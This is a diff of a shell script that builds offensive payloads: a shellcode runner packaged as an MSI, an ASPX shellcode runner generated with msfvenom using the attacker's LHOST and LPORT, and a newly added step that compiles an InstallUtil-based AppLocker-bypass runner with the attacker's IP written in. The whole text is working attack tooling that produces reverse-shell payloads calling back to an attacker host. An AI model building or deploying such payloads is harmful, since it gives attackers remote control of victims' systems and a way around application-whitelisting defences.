@@ -123,7 +123,12 @@ mono Templates/MSI/wix311-binaries/candle.exe -out Templates/MSI/ -arch x64 Temp
 wine Templates/MSI/wix311-binaries/light.exe -out Templates/MSI/shellcode_runner.msi Templates/MSI/shellcode_runner.wixobj -sval &>/dev/null
 rm Templates/MSI/shellcode_runner.wixpdb
 rm Templates/MSI/shellcode_runner.wixobj
-mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi 
+mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi
+
+echo "[+] Creating InstallUtil ..."
+cp Templates/Applocker/InstallUtil.cs payloads/Applocker/
+sed -i 's/KALI_IP/'${LHOST}'/g' payloads/Applocker/InstallUtil.cs
+mcs -out:payloads/Applocker/shellcode_runner.exe payloads/Applocker/InstallUtil.cs &>/dev/null
 
 echo "[+] Creating web.config file (Non-Encrypted)..."
 MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
